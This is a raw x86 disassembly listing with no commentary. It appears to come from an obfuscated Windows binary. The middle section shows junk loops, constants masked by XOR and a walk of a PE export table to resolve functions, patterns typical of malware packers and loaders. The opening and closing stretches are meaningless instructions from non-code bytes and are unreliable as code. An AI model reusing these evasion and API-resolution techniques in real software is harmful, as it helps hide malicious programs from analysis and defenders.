  409990:	mov    eax,edi
  409992:	fisttp DWORD PTR [eax-0x6d993475]
  409998:	pop    ss
  409999:	iret   
  40999a:	pop    es
  40999b:	ror    BYTE PTR [edx+0x37],cl
  40999e:	mov    dl,0x17
  4099a0:	in     al,dx
  4099a1:	call   0x35b029c5
  4099a6:	jg     0x40999e
  4099a8:	(bad)  
  4099a9:	(bad)  
  4099aa:	sti    
  4099ab:	aas    
  4099ac:	mov    dh,0xb8
  4099ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099b0:	gs and cl,bh
  4099b3:	shr    DWORD PTR [eax+0x38db34c7],1
  4099b9:	pop    esi
  4099ba:	out    0x27,eax
  4099bc:	mov    dh,0xfc
  4099be:	int    0xdd
  4099c0:	xor    ax,0xd153
  4099c4:	mov    edi,0x96e933bd
  4099c9:	mov    ebp,0x1771ddae
  4099ce:	jmp    0x4900b71d
  4099d3:	retf   0xd9ae
  4099d6:	dec    ecx
  4099d7:	(bad)  
  4099d8:	js     0x40996d
  4099da:	call   0xe8ff6d2e
  4099df:	mov    al,0xda
  4099e1:	adc    al,0x27
  4099e3:	je     0x4099a4
  4099e5:	rcl    BYTE PTR [eax-0x6965dc8c],cl
  4099eb:	in     eax,dx
  4099ec:	repz jmp esp
  4099ef:	mov    ecx,0x852205c4
  4099f4:	fdivr  QWORD PTR [edi+0x3bc56cc0]
  4099fa:	jns    0x4099d9
  4099fc:	pop    ebp
  4099fd:	dec    eax
  4099fe:	add    dl,BYTE PTR [ecx]
  409a00:	sbb    ah,BYTE PTR [ebx]
  409a02:	xchg   edx,eax
  409a03:	jb     0x4099ec
  409a05:	xlat   BYTE PTR ds:[ebx]
  409a06:	clc    
  409a07:	je     0x409a6a
  409a09:	mov    ds:0x446c3bc6,al
  409a0e:	daa    
  409a0f:	push   esi
  409a10:	shr    ebx,0xa9
  409a13:	dec    ebp
  409a14:	out    0xb1,al
  409a16:	mov    al,0x5d
  409a18:	xor    bl,BYTE PTR [ecx+0x634f7467]
  409a1e:	push   ebx
  409a1f:	repz xchg ecx,eax
  409a21:	mov    dl,dh
  409a23:	push   0x3daa8a2e
  409a28:	cmp    al,al
  409a2a:	in     eax,0xb8
  409a2c:	scas   eax,DWORD PTR es:[edi]
  409a2d:	mov    dh,0x47
  409a2f:	add    BYTE PTR [ebx+edx*1+0x3],ch
  409a33:	enter  0x2581,0xc
  409a37:	mov    al,0x42
  409a39:	add    BYTE PTR [eax],al
  409a3b:	add    BYTE PTR [eax],al
  409a3d:	add    BYTE PTR [ebx+0x42b00c35],cl
  409a43:	add    BYTE PTR [esi-0x77],al
  409a46:	xor    eax,0x42b00c
  409a4b:	cmp    DWORD PTR ds:0x42b00c,0x29
  409a52:	jne    0x409a63
  409a58:	push   0x42e1b7
  409a5d:	call   DWORD PTR ds:0x42ed57
  409a63:	cmp    DWORD PTR ds:0x42b00c,0x1e
  409a6a:	jb     0x409a3e
  409a70:	sbb    esi,DWORD PTR ds:0x42a00c
  409a76:	mov    DWORD PTR [ebp-0x8],ecx
  409a79:	mov    ecx,DWORD PTR [ebp-0x14]
  409a7c:	xor    esi,0x35c3
  409a82:	xor    ecx,ebx
  409a84:	inc    DWORD PTR ds:0x42a000
  409a8a:	add    ecx,eax
  409a8c:	mov    DWORD PTR ds:0x429014,0x1c
  409a96:	cmp    DWORD PTR ds:0x429014,0x0
  409a9d:	je     0x409ad1
  409aa3:	cmp    DWORD PTR ds:0x429014,0x28
  409aaa:	jne    0x409ab9
  409ab0:	push   DWORD PTR [ebp-0x14]
  409ab3:	call   DWORD PTR ds:0x42ed5b
  409ab9:	mov    esi,DWORD PTR ds:0x429014
  409abf:	dec    esi
  409ac0:	mov    DWORD PTR ds:0x429014,esi
  409ac6:	jmp    0x409a96
  409acb:	xor    esi,DWORD PTR ds:0x42a01c
  409ad1:	mov    DWORD PTR [ebp-0x2c],ecx
  409ad4:	or     esi,0x1d45
  409ada:	mov    ecx,DWORD PTR [ebp-0x4]
  409add:	xor    ecx,ebx
  409adf:	add    ecx,eax
  409ae1:	mov    DWORD PTR [ebp-0x38],ecx
  409ae4:	dec    DWORD PTR ds:0x42901c
  409aea:	mov    esi,DWORD PTR [ebp-0x4]
  409aed:	xor    esi,ebx
  409aef:	add    esi,eax
  409af1:	sbb    ecx,0x1004
  409af7:	mov    ecx,DWORD PTR [ebp-0x2c]
  409afa:	sub    ecx,eax
  409afc:	lea    edx,[esi-0x3272e0]
  409b02:	xor    ecx,ebx
  409b04:	xor    DWORD PTR ds:0x42d01c,0x7c44
  409b0e:	xor    edx,ebx
  409b10:	cmp    edx,ecx
  409b12:	je     0x409e56
  409b18:	and    DWORD PTR ds:0x429004,0x0
  409b22:	jmp    0x409b34
  409b27:	mov    ecx,DWORD PTR ds:0x429004
  409b2d:	inc    ecx
  409b2e:	mov    DWORD PTR ds:0x429004,ecx
  409b34:	cmp    DWORD PTR ds:0x429004,0x18
  409b3b:	jae    0x409b89
  409b41:	cmp    DWORD PTR ds:0x429004,0xb
  409b48:	jne    0x409b5e
  409b4e:	push   0x42b000
  409b53:	push   0x88b5
  409b58:	call   DWORD PTR ds:0x42ed5f
  409b5e:	cmp    DWORD PTR ds:0x429004,0xa
  409b65:	jne    0x409b78
  409b6b:	mov    ecx,DWORD PTR ds:0x429004
  409b71:	inc    ecx
  409b72:	mov    DWORD PTR ds:0x429004,ecx
  409b78:	jmp    0x409b27
  409b7d:	mov    ecx,DWORD PTR ds:0x429000
  409b83:	or     DWORD PTR ds:0x42c00c,ecx
  409b89:	mov    ecx,DWORD PTR [ebp-0x4]
  409b8c:	xor    ecx,ebx
  409b8e:	sbb    DWORD PTR ds:0x42c010,0x429014
  409b98:	add    ecx,eax
  409b9a:	mov    DWORD PTR ds:0x42d014,0x6091
  409ba4:	cmp    esi,ecx
  409ba6:	mov    DWORD PTR ds:0x429004,0x556c
  409bb0:	jne    0x409e33
  409bb6:	push   DWORD PTR [ebp+0x8]
  409bb9:	adc    DWORD PTR ds:0x42a004,0x6cab
  409bc3:	call   0x404ffa
  409bc8:	mov    DWORD PTR ds:0x429020,0x17
  409bd2:	cmp    DWORD PTR ds:0x429020,0x0
  409bd9:	je     0x409c3a
  409bdf:	cmp    DWORD PTR ds:0x429020,0xa
  409be6:	jne    0x409c0a
  409bec:	push   0x42e126
  409bf1:	push   0x21eb
  409bf6:	push   DWORD PTR [ebp-0x24]
  409bf9:	push   DWORD PTR [ebp-0x28]
  409bfc:	push   0x2bd0
  409c01:	push   DWORD PTR [ebp-0x20]
  409c04:	call   DWORD PTR ds:0x42ed67
  409c0a:	cmp    DWORD PTR ds:0x429020,0xb
  409c11:	jne    0x409c24
  409c17:	mov    ecx,DWORD PTR ds:0x429020
  409c1d:	dec    ecx
  409c1e:	mov    DWORD PTR ds:0x429020,ecx
  409c24:	xor    ecx,ecx
  409c26:	xor    ecx,DWORD PTR ds:0x429020
  409c2c:	dec    ecx
  409c2d:	mov    DWORD PTR ds:0x429020,ecx
  409c33:	jmp    0x409bd2
  409c38:	xor    ecx,edi
  409c3a:	mov    DWORD PTR [ebp-0x20],eax
  409c3d:	mov    eax,DWORD PTR [ebp-0x4]
  409c40:	mov    ecx,DWORD PTR [ebp-0x20]
  409c43:	mov    DWORD PTR ds:0x42c004,0x1b
  409c4d:	cmp    DWORD PTR ds:0x42c004,0x0
  409c54:	je     0x409c81
  409c5a:	cmp    DWORD PTR ds:0x42c004,0x22
  409c61:	jne    0x409c6d
  409c67:	call   DWORD PTR ds:0x42ed6b
  409c6d:	xor    edi,edi
  409c6f:	add    edi,DWORD PTR ds:0x42c004
  409c75:	dec    edi
  409c76:	mov    DWORD PTR ds:0x42c004,edi
  409c7c:	jmp    0x409c4d
  409c81:	xor    eax,ebx
  409c83:	sbb    edi,0x4123
  409c89:	mov    edi,0x3272e0
  409c8e:	xor    DWORD PTR ds:0x42d00c,0x429018
  409c98:	add    eax,edi
  409c9a:	mov    DWORD PTR ds:0x42c00c,0x6160
  409ca4:	cmp    ecx,eax
  409ca6:	je     0x409ec6
  409cac:	add    DWORD PTR ds:0x42c014,0x5bfc
  409cb6:	push   DWORD PTR [ebp-0x20]
  409cb9:	push   DWORD PTR [ebp+0x8]
  409cbc:	or     DWORD PTR ds:0x42d014,0x42b000
  409cc6:	call   0x4113c7
  409ccb:	mov    DWORD PTR ds:0x42d014,0x10
  409cd5:	cmp    DWORD PTR ds:0x42d014,0x0
  409cdc:	je     0x409dd4
  409ce2:	cmp    DWORD PTR ds:0x42d014,0x19
  409ce9:	jne    0x409cff
  409cef:	push   0x429004
  409cf4:	push   0x42e185
  409cf9:	call   DWORD PTR ds:0x42ed6f
  409cff:	mov    ecx,DWORD PTR ds:0x42d014
  409d05:	dec    ecx
  409d06:	mov    DWORD PTR ds:0x42d014,ecx
  409d0c:	jmp    0x409cd5
  409d11:	and    DWORD PTR ds:0x42c018,0x0
  409d1b:	jmp    0x409d2d
  409d20:	mov    ecx,DWORD PTR ds:0x42c018
  409d26:	inc    ecx
  409d27:	mov    DWORD PTR ds:0x42c018,ecx
  409d2d:	cmp    DWORD PTR ds:0x42c018,0x19
  409d34:	jae    0x409dd4
  409d3a:	cmp    DWORD PTR ds:0x42c018,0x5
  409d41:	jne    0x409d52
  409d47:	push   0x42e118
  409d4c:	call   DWORD PTR ds:0x42ed73
  409d52:	cmp    DWORD PTR ds:0x42c018,0x4
  409d59:	jne    0x409d6c
  409d5f:	mov    ecx,DWORD PTR ds:0x42c018
  409d65:	inc    ecx
  409d66:	mov    DWORD PTR ds:0x42c018,ecx
  409d6c:	jmp    0x409d20
  409d71:	mov    DWORD PTR ds:0x429024,0x1c
  409d7b:	cmp    DWORD PTR ds:0x429024,0x0
  409d82:	je     0x409dd4
  409d88:	cmp    DWORD PTR ds:0x429024,0x2
  409d8f:	jne    0x409da0
  409d95:	push   0x18d9
  409d9a:	call   DWORD PTR ds:0x42ed77
  409da0:	cmp    DWORD PTR ds:0x429024,0x3
  409da7:	jne    0x409dba
  409dad:	mov    ecx,DWORD PTR ds:0x429024
  409db3:	dec    ecx
  409db4:	mov    DWORD PTR ds:0x429024,ecx
  409dba:	xor    ecx,ecx
  409dbc:	or     ecx,DWORD PTR ds:0x429024
  409dc2:	dec    ecx
  409dc3:	mov    DWORD PTR ds:0x429024,ecx
  409dc9:	jmp    0x409d7b
  409dce:	and    DWORD PTR ds:0x42c01c,edi
  409dd4:	mov    DWORD PTR [ebp-0x20],eax
  409dd7:	and    DWORD PTR ds:0x42a00c,ecx
  409ddd:	mov    eax,DWORD PTR [ebp-0x4]
  409de0:	mov    ecx,DWORD PTR [ebp-0x20]
  409de3:	dec    DWORD PTR ds:0x42a010
  409de9:	xor    eax,ebx
  409deb:	add    eax,edi
  409ded:	mov    DWORD PTR ds:0x42b00c,0x6616
  409df7:	cmp    ecx,eax
  409df9:	je     0x409ec6
  409dff:	mov    eax,DWORD PTR [ebp-0x20]
  409e02:	mov    eax,DWORD PTR [eax+0x18]
  409e05:	mov    DWORD PTR [ebp-0x2c],eax
  409e08:	mov    eax,DWORD PTR [ebp-0x20]
  409e0b:	mov    ecx,DWORD PTR [ebp+0x8]
  409e0e:	add    ecx,DWORD PTR [eax+0x20]
  409e11:	mov    DWORD PTR [ebp-0x34],ecx
  409e14:	mov    eax,DWORD PTR [ebp-0x20]
  409e17:	mov    ecx,DWORD PTR [ebp+0x8]
  409e1a:	add    ecx,DWORD PTR [eax+0x24]
  409e1d:	mov    DWORD PTR [ebp-0x3c],ecx
  409e20:	mov    eax,DWORD PTR [ebp-0x20]
  409e23:	mov    ecx,DWORD PTR [ebp+0x8]
  409e26:	add    ecx,DWORD PTR [eax+0x1c]
  409e29:	mov    eax,edi
  409e2b:	mov    DWORD PTR [ebp-0x20],ecx
  409e2e:	jmp    0x409e8e
  409e33:	mov    ecx,DWORD PTR [ebp-0x34]
  409e36:	mov    edx,DWORD PTR [ebp+0x8]
  409e39:	add    edx,DWORD PTR [ecx+esi*4]
  409e3c:	mov    DWORD PTR [ebp-0x30],edx
  409e3f:	mov    ecx,DWORD PTR [ebp-0x4]
  409e42:	mov    edx,DWORD PTR [ebp-0x30]
  409e45:	xor    ecx,ebx
  409e47:	add    ecx,eax
  409e49:	cmp    edx,ecx
  409e4b:	je     0x409e8e
  409e51:	jmp    0x409e7a
  409e56:	mov    ecx,DWORD PTR [ebp-0x4]
  409e59:	mov    edx,DWORD PTR [ebp-0x8]
  409e5c:	xor    ecx,ebx
  409e5e:	add    ecx,eax
  409e60:	cmp    edx,ecx
  409e62:	je     0x409ed2
  409e68:	mov    ecx,DWORD PTR [ebp-0x4]
  409e6b:	mov    edx,DWORD PTR [ebp-0x38]
  409e6e:	xor    ecx,ebx
  409e70:	add    ecx,eax
  409e72:	cmp    edx,ecx
  409e74:	je     0x409ee1
  409e7a:	lea    eax,[ebp-0x8]
  409e7d:	push   eax
  409e7e:	push   DWORD PTR [ebp-0x30]
  409e81:	push   DWORD PTR [ebp+0xc]
  409e84:	call   0x411671
  409e89:	mov    eax,0x3272e0
  409e8e:	mov    ecx,DWORD PTR [ebp-0x4]
  409e91:	mov    edx,DWORD PTR [ebp-0x8]
  409e94:	xor    ecx,ebx
  409e96:	add    ecx,eax
  409e98:	cmp    edx,ecx
  409e9a:	je     0x409eb5
  409ea0:	mov    ecx,DWORD PTR [ebp-0x3c]
  409ea3:	movzx  ecx,WORD PTR [ecx+esi*2]
  409ea7:	mov    edx,DWORD PTR [ebp-0x20]
  409eaa:	mov    ecx,DWORD PTR [edx+ecx*4]
  409ead:	mov    DWORD PTR [ebp-0x40],ecx
  409eb0:	jmp    0x409e56
  409eb5:	mov    ecx,DWORD PTR [ebp-0x14]
  409eb8:	xor    ecx,ebx
  409eba:	lea    esi,[esi+ecx*1+0x3272e0]
  409ec1:	jmp    0x409af1
  409ec6:	mov    eax,DWORD PTR [ebp-0x4]
  409ec9:	xor    eax,ebx
  409ecb:	add    eax,edi
  409ecd:	jmp    0x40a045
  409ed2:	mov    eax,DWORD PTR [ebp-0x4]
  409ed5:	xor    eax,ebx
  409ed7:	add    eax,0x3272e0
  409edc:	jmp    0x40a045
  409ee1:	mov    ecx,DWORD PTR [ebp-0x40]
  409ee4:	add    ecx,DWORD PTR [ebp+0x8]
  409ee7:	mov    DWORD PTR [ebp-0x10],ecx
  409eea:	mov    ecx,DWORD PTR [ebp-0x24]
  409eed:	test   ecx,ecx
  409eef:	je     0x409fd0
  409ef5:	mov    DWORD PTR [ebp-0x28],0x0
  409efc:	push   0x3
  409efe:	xor    edx,edx
  409f00:	pop    edx
  409f01:	add    edx,0x8
  409f04:	push   edx
  409f05:	pop    ecx
  409f06:	push   0x6
  409f08:	dec    ecx
  409f09:	pop    ebx
  409f0a:	dec    ebx
  409f0b:	xchg   ebx,ecx
  409f0d:	sub    ebx,ecx
  409f0f:	xchg   ebx,ecx
  409f11:	dec    ecx
  409f12:	mov    eax,DWORD PTR [ebp-0x24]
  409f15:	imul   eax,ecx
  409f18:	sub    esp,eax
  409f1a:	mov    DWORD PTR [ebp-0x28],esp
  409f1d:	mov    eax,DWORD PTR [ebp-0x4]
  409f20:	mov    ecx,0x7510899
  409f25:	xor    eax,ecx
  409f27:	mov    edx,0x3272e0
  409f2c:	add    eax,edx
  409f2e:	mov    DWORD PTR [ebp+0x8],eax
  409f31:	mov    eax,DWORD PTR [ebp-0x14]
  409f34:	xor    eax,ecx
  409f36:	add    eax,edx
  409f38:	mov    edx,DWORD PTR [ebp+0x14]
  409f3b:	imul   eax,DWORD PTR [edx]
  409f3e:	mov    edx,DWORD PTR [ebp-0x4]
  409f41:	xor    edx,ecx
  409f43:	mov    ecx,DWORD PTR [ebp+0x8]
  409f46:	lea    ecx,[edx+ecx*1+0x3272e0]
  409f4d:	cmp    ecx,eax
  409f4f:	je     0x409fc6
  409f55:	mov    edi,DWORD PTR [ebp-0x14]
  409f58:	mov    eax,DWORD PTR [ebp+0x8]
  409f5b:	mov    edx,DWORD PTR [ebp+0x14]
  409f5e:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  409f62:	mov    ecx,0x7510899
  409f67:	xor    edx,edx
  409f69:	xor    edi,ecx
  409f6b:	mov    esi,0x3272e0
  409f70:	add    edi,esi
  409f72:	div    edi
  409f74:	mov    edx,DWORD PTR [ebp-0x4]
  409f77:	xor    edx,ecx
  409f79:	lea    eax,[edx+eax*1+0x3272e0]
  409f80:	mov    edx,DWORD PTR [ebp+0x8]
  409f83:	mov    edi,DWORD PTR [ebp-0x28]
  409f86:	mov    DWORD PTR [edi+edx*4],eax
  409f89:	mov    eax,DWORD PTR [ebp-0x14]
  409f8c:	mov    edx,DWORD PTR [ebp+0x8]
  409f8f:	xor    eax,ecx
  409f91:	lea    eax,[eax+edx*1+0x3272e0]
  409f98:	mov    DWORD PTR [ebp+0x8],eax
  409f9b:	mov    eax,DWORD PTR [ebp-0x14]
  409f9e:	mov    edx,DWORD PTR [ebp+0x14]
  409fa1:	xor    eax,ecx
  409fa3:	add    eax,esi
  409fa5:	imul   eax,DWORD PTR [edx]
  409fa8:	mov    edx,DWORD PTR [ebp-0x4]
  409fab:	xor    edx,ecx
  409fad:	mov    ecx,DWORD PTR [ebp+0x8]
  409fb0:	lea    ecx,[edx+ecx*1+0x3272e0]
  409fb7:	cmp    ecx,eax
  409fb9:	jne    0x409f55
  409fbf:	mov    eax,esi
  409fc1:	jmp    0x409fcb
  409fc6:	mov    eax,0x3272e0
  409fcb:	mov    ebx,0x7510899
  409fd0:	mov    ecx,DWORD PTR [ebp-0x4]
  409fd3:	xor    ecx,ebx
  409fd5:	add    ecx,eax
  409fd7:	mov    DWORD PTR [ebp-0xc],ecx
  409fda:	mov    ebx,0x65655
  409fdf:	add    ebx,0x3234
  409fe5:	xchg   ebx,esi
  409fe7:	xor    ebx,ebx
  409fe9:	push   esi
  409fea:	mov    esi,ebx
  409fec:	pop    ebx
  409fed:	mov    edx,esi
  409fef:	add    ebx,0x1002
  409ff5:	lea    eax,[ebp-0x10]
  409ff8:	add    edx,eax
  409ffa:	add    edx,0x5
  409ffd:	push   edx
  409ffe:	inc    esi
  409fff:	pop    ecx
  40a000:	dec    ecx
  40a001:	xchg   ecx,eax
  40a002:	dec    eax
  40a003:	xchg   ecx,eax
  40a004:	dec    ecx
  40a005:	xchg   ecx,edx
  40a007:	dec    edx
  40a008:	push   edx
  40a009:	mov    edx,ebx
  40a00b:	pop    ebx
  40a00c:	dec    ebx
  40a00d:	call   DWORD PTR [ebx]
  40a00f:	cmp    DWORD PTR [ebp+0x10],esi
  40a012:	je     0x40a031
  40a018:	xchg   edx,eax
  40a019:	push   0xb
  40a01b:	pop    ecx
  40a01c:	push   0x4
  40a01e:	pop    ebx
  40a01f:	inc    ebx
  40a020:	xchg   ebx,ecx
  40a022:	sub    ebx,ecx
  40a024:	xchg   ebx,ecx
  40a026:	dec    ecx
  40a027:	dec    ecx
  40a028:	mov    eax,DWORD PTR [ebp-0x24]
  40a02b:	imul   eax,ecx
  40a02e:	add    esp,eax
  40a030:	xchg   edx,eax
  40a031:	push   eax
  40a032:	xor    ebx,ebx
  40a034:	mov    edx,esp
  40a036:	dec    edx
  40a037:	inc    ebx
  40a038:	add    ebx,DWORD PTR [edx+ebx*1]
  40a03b:	dec    ebx
  40a03c:	xor    edx,edx
  40a03e:	add    DWORD PTR [ebp-0xc],ebx
  40a041:	pop    ebx
  40a042:	mov    eax,DWORD PTR [ebp-0xc]
  40a045:	pop    edi
  40a046:	pop    esi
  40a047:	pop    ebx
  40a048:	leave  
  40a049:	ret    0x10
  40a04c:	push   ebp
  40a04d:	mov    ebp,esp
  40a04f:	sub    esp,0x7c
  40a052:	sbb    eax,DWORD PTR ds:0x429020
  40a058:	push   esi
  40a059:	mov    ecx,DWORD PTR ds:0x42c018
  40a05f:	adc    ecx,DWORD PTR ds:0x42c004
  40a065:	mov    DWORD PTR ds:0x42c018,ecx
  40a06b:	push   edi
  40a06c:	mov    eax,ds:0x42e42f
  40a071:	adc    ecx,esi
  40a073:	mov    DWORD PTR [ebp-0x24],eax
  40a076:	mov    eax,ds:0x42e53b
  40a07b:	mov    DWORD PTR [ebp-0x34],eax
  40a07e:	and    DWORD PTR ds:0x429008,0x0
  40a088:	jmp    0x40a09c
  40a08d:	xor    edi,edi
  40a08f:	or     edi,DWORD PTR ds:0x429008
  40a095:	inc    edi
  40a096:	mov    DWORD PTR ds:0x429008,edi
  40a09c:	cmp    DWORD PTR ds:0x429008,0x18
  40a0a3:	jae    0x40a0ce
  40a0a9:	cmp    DWORD PTR ds:0x429008,0x26
  40a0b0:	jne    0x40a0c9
  40a0b6:	push   0x42e23b
  40a0bb:	push   0x42e1b7
  40a0c0:	push   DWORD PTR [ebp-0x24]
  40a0c3:	call   DWORD PTR ds:0x42ed83
  40a0c9:	jmp    0x40a08d
  40a0ce:	and    DWORD PTR [ebp-0x30],0x0
  40a0d2:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  40a0d9:	mov    ecx,DWORD PTR ds:0x42c00c
  40a0df:	adc    DWORD PTR ds:0x42c010,ecx
  40a0e5:	jmp    0x40c45f
  40a0ea:	gs push 0x7b5b7b64
  40a0f0:	jne    0x40a07a
  40a0f2:	jle    0x40a0d8
  40a0f4:	(bad)  
  40a0f5:	(bad)  
  40a0f6:	imul   ebp,ebx,0x2c4d6c
  40a0fc:	jp     0x40a178
  40a0fe:	adc    eax,0x807a7a5f
  40a103:	ja     0x40a134
  40a105:	jne    0x40a0de
  40a107:	inc    ebp
  40a109:	xchg   BYTE PTR [eax-0x6240e4db],bl
  40a10f:	ficom  DWORD PTR [edx+0x7bfb088d]
  40a115:	push   esi
  40a116:	jle    0x40a110
  40a118:	in     eax,0xfe
  40a11a:	mov    cl,0x5b
  40a11c:	dec    edx
  40a11d:	sub    DWORD PTR ds:0xbbfe55b2,ecx
  40a123:	pop    esi
  40a124:	popf   
  40a125:	sub    al,0x1f
  40a127:	mov    ebp,0x73233377
  40a12c:	data16 sub al,BYTE PTR [edx+0x25913a74]
  40a133:	xchg   esi,eax
  40a134:	arpl   WORD PTR [ebp-0xc],si
  40a137:	aaa    
  40a138:	(bad)  
  40a139:	mov    edi,0x437c1b5
  40a13e:	mov    edi,0x1080ec2
  40a143:	fucomip st,st(1)
  40a145:	inc    eax
  40a146:	and    dl,BYTE PTR [edi]
  40a148:	jl     0x40a1ab
  40a14a:	mov    ch,0x58
  40a14c:	mov    ebp,0x6f9c4339
  40a151:	popf   
  40a152:	aaa    
  40a153:	repnz cwde 
  40a155:	ja     0x40a110
  40a157:	xchg   edi,eax
  40a158:	retf   
  40a159:	das    
  40a15a:	push   edi
  40a15b:	imul   ebx,DWORD PTR [eax+eiz*1],0x30c9614
  40a162:	or     DWORD PTR [eax],esp
  40a164:	loop   0x40a180
  40a166:	add    ebp,edi
  40a168:	stc    
  40a169:	push   cs
  40a16a:	xchg   edx,eax
  40a16b:	sub    esp,DWORD PTR [ecx]
  40a16d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a16e:	ret    
  40a16f:	sbb    esi,edi
  40a171:	cmp    ecx,eax
  40a173:	pop    edi
  40a174:	or     al,0x2e
  40a176:	gs cmp al,0x7f
  40a179:	adc    BYTE PTR [ebx],dh
  40a17b:	ret    0xac90
  40a17e:	addr16 in eax,dx
  40a180:	repnz inc ecx
  40a182:	inc    esp
  40a183:	mov    es,WORD PTR [esi+0x26]
  40a186:	pop    edi
  40a187:	jnp    0x40a1bd
  40a189:	push   esi
  40a18a:	inc    DWORD PTR [ebx+0xf]
  40a18d:	sti    
  40a18e:	shl    DWORD PTR [ebp-0x767e33fa],1
  40a194:	and    al,0x6d
  40a197:	ins    BYTE PTR es:[edi],dx
  40a198:	fsub   st,st(1)
  40a19a:	xchg   ebx,eax
  40a19b:	add    ah,dh
  40a19d:	mov    ebp,0x76b031d6
  40a1a2:	push   cs
  40a1a3:	push   ebx
  40a1a4:	xlat   BYTE PTR ds:[ebx]
  40a1a5:	and    al,0x2c
  40a1a7:	push   edi
  40a1a8:	sbb    ah,BYTE PTR [eax+0x70]
  40a1ab:	enter  0xdb7b,0x5c
  40a1af:	or     esi,DWORD PTR [eax+0x4b86c81a]
  40a1b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1b6:	xor    BYTE PTR [edx+0x5941a78e],bl
  40a1bc:	adc    DWORD PTR [ecx+0xba99a57],edx
  40a1c2:	mov    cl,0x40
  40a1c4:	imul   esp,DWORD PTR [ecx],0x17
  40a1c7:	mov    ds:0x7b0264b4,al
  40a1cc:	retfw  
  40a1ce:	xchg   DWORD PTR [ebx-0x6b],ecx
  40a1d1:	xchg   esp,eax
  40a1d2:	cmp    esp,eax
  40a1d4:	(bad)  
  40a1d5:	in     al,dx
  40a1d6:	jns    0x40a200
  40a1d8:	into   
  40a1d9:	shl    dl,1
  40a1db:	mov    ds:0x7088f8d6,al
  40a1e0:	mov    ebx,0x7cd7f5f3
  40a1e5:	dec    edi
  40a1e6:	sub    al,0xd9
  40a1e8:	sub    cl,bh
  40a1ea:	scas   al,BYTE PTR es:[edi]
  40a1eb:	fstp   DWORD PTR [eax+0x4669b0d]
  40a1f1:	pop    ecx
  40a1f2:	(bad)  
  40a1f3:	in     eax,0x9e
  40a1f5:	inc    edi
  40a1f6:	jns    0x40a1d8
  40a1f8:	pop    esi
  40a1f9:	out    dx,eax
  40a1fa:	dec    ebp
  40a1fb:	sub    ebp,ecx
  40a1fd:	pop    ss
  40a1fe:	or     ecx,esp
  40a200:	js     0x40a1ec
  40a202:	mov    edx,0xa3c140e1
  40a207:	loope  0x40a1d3
  40a209:	jmp    DWORD PTR [eax+0x6f]
  40a20c:	in     al,0x52
  40a20e:	out    0xd7,al
  40a210:	pop    eax
  40a211:	scas   eax,DWORD PTR es:[edi]
  40a212:	data16 sbb ah,bl
  40a215:	sahf   
  40a216:	sub    bh,dh
  40a218:	mov    ecx,0x7ba39e6f
  40a21d:	(bad)  
  40a21e:	pop    ebp
  40a21f:	mov    al,ds:0x1a5b1d4
  40a224:	pop    edi
  40a225:	jle    0x40a1f6
  40a227:	jp     0x40a216
  40a229:	pop    es
  40a22a:	cmp    eax,0x768547ea
  40a22f:	push   ebp
  40a230:	dec    ecx
  40a231:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40a233:	inc    esp
  40a234:	and    eax,0x2e9573df
  40a239:	xor    ebp,esi
  40a23b:	sbb    esi,DWORD PTR [ebp+0x64]
  40a23e:	les    esi,FWORD PTR [edx+0x16]
  40a241:	xor    ebx,DWORD PTR [eax]
  40a243:	sub    edx,DWORD PTR [edi-0x2bd06f61]
  40a249:	push   es
  40a24a:	push   ebx
  40a24b:	dec    edi
  40a24c:	(bad)  
  40a24d:	(bad)  
  40a24e:	mov    dh,BYTE PTR [ebx+ecx*8]
  40a251:	xchg   ecx,eax
  40a252:	mov    edx,0x29020235
  40a257:	and    al,0x7c
  40a259:	(bad)  
  40a25a:	jmp    DWORD PTR [edi]
  40a25c:	mov    ds:0x10edba6a,al
  40a261:	adc    DWORD PTR [esi+edi*1],ebp
  40a264:	cs and esi,ebp
  40a267:	mov    ebx,0xdde65bcb
  40a26c:	and    al,0xba
  40a26e:	stc    
  40a26f:	push   ds
  40a270:	cmp    al,0xd8
  40a272:	mov    al,0xc8
  40a274:	mov    bl,0xa2
  40a276:	sub    BYTE PTR [edi+0x1a0c1142],ah
  40a27c:	mov    ds:0xe057a72c,al
  40a281:	pushf  
  40a282:	add    BYTE PTR [esi-0x72669af7],dl
  40a288:	adc    al,0xe6
  40a28a:	rcl    edx,cl
  40a28c:	mov    edx,0x5757c71a
  40a291:	(bad)  
  40a292:	mov    ds:0x7741b5de,al
  40a297:	mov    esp,0x7c311aeb
  40a29c:	mov    al,ds:0x66852243
  40a2a1:	adc    BYTE PTR [esi-0x6f9fb1e5],cl
  40a2a7:	pop    edx
  40a2a8:	in     al,dx
  40a2a9:	ret    0x54ab
  40a2ac:	(bad)  
  40a2ad:	std    
  40a2ae:	jno    0x40a279
  40a2b0:	mov    ah,0x60
  40a2b2:	rcl    DWORD PTR [esi+0x3f],0xdd
  40a2b6:	mov    cl,0x9e
  40a2b8:	pushw  0x1b12
  40a2bc:	(bad)  [ebx]
  40a2be:	inc    ecx
  40a2bf:	loope  0x40a2d3
  40a2c1:	mov    bh,BYTE PTR [edx]
  40a2c3:	in     al,dx
  40a2c4:	fst    DWORD PTR [ebx+0x43]
  40a2c7:	xchg   ebp,eax
  40a2c8:	loop   0x40a2e5
  40a2ca:	pop    eax
  40a2cb:	out    0x18,al
  40a2cd:	cmp    edx,DWORD PTR ds:0x23cb8ca7
  40a2d3:	in     al,dx
  40a2d4:	push   ebx
  40a2d5:	rcl    BYTE PTR [ecx],cl
  40a2d7:	mov    BYTE PTR [ebp-0x7e],ch
  40a2da:	cmc    
  40a2db:	adc    DWORD PTR [ecx-0x2e],esi
  40a2de:	test   al,0x5
  40a2e0:	sub    al,0xfc
  40a2e2:	and    edx,DWORD PTR [edx-0x2ded869e]
  40a2e8:	sbb    ah,BYTE PTR [ebx]
  40a2ea:	aas    
  40a2eb:	xor    DWORD PTR [edx+0x6410978],ecx
  40a2f1:	retf   
  40a2f2:	mov    edi,DWORD PTR [edx]
  40a2f4:	call   0xaa4bc76d
  40a2f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2fa:	call   FWORD PTR [esi-0x4062f508]
  40a300:	or     BYTE PTR [ebx],ah
  40a302:	xchg   esp,eax
  40a303:	lea    ebx,[ebx+0x1b]
  40a306:	dec    ebx
  40a307:	pop    ecx
